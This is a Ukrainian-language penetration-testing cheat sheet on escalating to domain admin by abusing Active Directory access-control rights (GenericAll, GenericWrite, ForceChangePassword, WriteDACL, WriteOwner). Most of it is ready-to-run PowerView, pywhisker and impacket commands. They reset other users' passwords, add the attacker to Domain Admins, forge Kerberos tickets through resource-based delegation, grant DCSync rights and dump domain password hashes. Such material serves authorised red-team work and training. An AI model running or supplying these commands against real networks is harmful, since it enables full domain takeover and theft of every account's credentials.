# ACL Abuse

BloodHound → Outbound Object Control / шлях до DA → дивись edge-тип і використовуй відповідний вектор.

## Де шукати
```powershell
# PowerView: які ACL дає нам поточний юзер?
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq "<our-user>" }
```
BloodHound → Node Info → Outbound Object Control / Transitive Object Control.

---

## GenericAll (повний контроль над об'єктом)

### Над user-акаунтом → скинути пароль
```powershell
Set-DomainUserPassword -Identity <target-user> -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
```

### Над групою → додати себе
```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members "<our-user>"
```

### Над computer → RBCD або Shadow Credentials (якщо є ADCS)
```bash
# Shadow Credentials через pywhisker
pywhisker -d <domain> -u <our-user> -p <pass> --target <computer$> --action add
```

---

## GenericWrite

### На user → додати SPN → Kerberoast
```powershell
Set-DomainObject -Identity <target-user> -Set @{serviceprincipalname='fake/spn'}
# далі Kerberoast цей акаунт -> [[Kerberoast-ASREP]]
```

### На computer → RBCD
```bash
impacket-rbcd -dc-ip <DC> -action write -delegate-to '<target-computer$>' \
  -delegate-from '<our-controlled-computer$>' '<domain>/<our-user>:<pass>'
# отримати тікет:
impacket-getST -spn 'cifs/<target-computer>' -impersonate Administrator \
  '<domain>/<our-controlled-computer$>' -hashes :<NTLM>
export KRB5CCNAME=Administrator@cifs_<target>.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<target>
```

---

## ForceChangePassword

```bash
# Linux (net rpc)
net rpc password <target-user> 'P@ssw0rd123!' -U '<domain>/<our-user>%<pass>' -S <DC>
# PowerView
$pw = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target-user> -AccountPassword $pw
```

---

## WriteDACL

```powershell
# Дати собі DCSync-права на домен
Add-DomainObjectAcl -TargetIdentity "<domain>" -Rights DCSync -PrincipalIdentity "<our-user>"
# потім:
impacket-secretsdump '<domain>/<our-user>:<pass>'@<DC>
```

---

## WriteOwner

```powershell
# Стати власником об'єкта, потім дати собі GenericAll
Set-DomainObjectOwner -Identity <target> -OwnerIdentity "<our-user>"
Add-DomainObjectAcl -TargetIdentity <target> -Rights All -PrincipalIdentity "<our-user>"
```

---

## Підводні камені
- `Add-DomainGroupMember` до DA → зміни в AD реплікуються не миттєво; зачекай хвилину або зайди заново
- Shadow Credentials вимагає ADCS (або KDC підтримки PKINIT) — перевір `ldap://` на наявність CA
- RBCD потрібен computer-акаунт під контролем (або створи: `impacket-addcomputer`)

**Зв'язки:** [[AD-Enumeration]] · [[Kerberoast-ASREP]] · [[DCSync-Tickets]] · [[Lateral-Movement]]
